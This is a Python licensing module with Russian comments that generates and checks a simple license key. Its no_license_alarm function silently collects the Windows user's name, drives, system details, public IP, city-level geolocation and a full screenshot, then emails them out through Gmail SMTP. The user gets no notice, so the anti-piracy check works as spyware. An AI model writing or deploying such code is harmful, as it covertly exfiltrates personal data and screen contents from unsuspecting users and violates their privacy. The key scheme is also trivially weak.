import getpass
import os
import platform
import smtplib
import sys
import time
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests
import win32api
from PIL import ImageGrab
from ip2geotools.databases.noncommercial import DbIpCity
import random

# меняем на свое
from_mail = 'email@gmail.com'
to_mail = 'mail@server.com'
passw = 'passwordfrommail'


def no_license_alarm():
    # собираем данные
    username = os.getlogin()
    drives = str(win32api.GetLogicalDriveStrings())
    drives = str(drives.split('\000')[:-1])
    response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')
    all_data = "Попытка нелицензионного запуска программы пользователем " + username + '\n' \
               + "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() \
               + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() \
               + ' ' + platform.release() + '\nIP: ' + requests.get("https://ramziv.com/ip").text \
               + '\nГород: ' + response.city + '\nGen_Location:' + response.to_json() + '\nДиски:' + drives
    # готовим письмо
    msgtext = MIMEText(all_data.encode('utf-8'), 'plain', 'utf-8')
    msg = MIMEMultipart()
    msg['From'] = from_mail
    msg['To'] = to_mail
    msg['Subject'] = getpass.getuser() + '-PC'
    msg.attach(msgtext)
    pathscreen = 'C:\\Users\\' + username + '\\AppData\\Roaming\\sreenshot.jpg'
    with open(pathscreen, 'rb') as fp:
        img = MIMEImage(fp.read())
    msg.attach(img)
    # отправка
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_mail, passw)
    s.sendmail(from_mail, to_mail, msg.as_string())
    s.quit()


def generate_license(filename):
    # генерируем лицензию
    my_file = open(filename, "w+")
    alphabet = list('qwertyuiopasdfghjklzxcvbnm')
    unusual = list('!@#$%^&*()?":>}{][')
    licensekey = []
    licensekey.append('0')
    licensekey.append(str(random.randint(0, 9)))
    for i in range(3):
        licensekey.append(random.choice(alphabet))
    for i in range(3):
        licensekey.append(random.choice(unusual))
    licensekey.append(str(random.randint(0, 9)))
    licensekey.append('0')
    licensekey = ''.join(licensekey)
    my_file.write(licensekey)
    my_file.close()


def check_license(fname):
    # проверяем лицензию
    if os.path.isfile(fname):
        f = open(fname, mode="r")
        licensekey = f.read(10)
        if licensekey[0] == '0' and licensekey[1] in '0123456789' and licensekey[-1] == '0' and licensekey[
            -2] in '0123456789':
            for i in range(2, 5):
                if licensekey[i].isalpha():
                    pass
                else:
                    return False
            for i in range(5, 8):
                if licensekey[i] in '!@#$%^&*()?":>}{][':
                    pass
                else:
                    return False
            return True
        else:
            return False
        f.close()
    else:
        return False
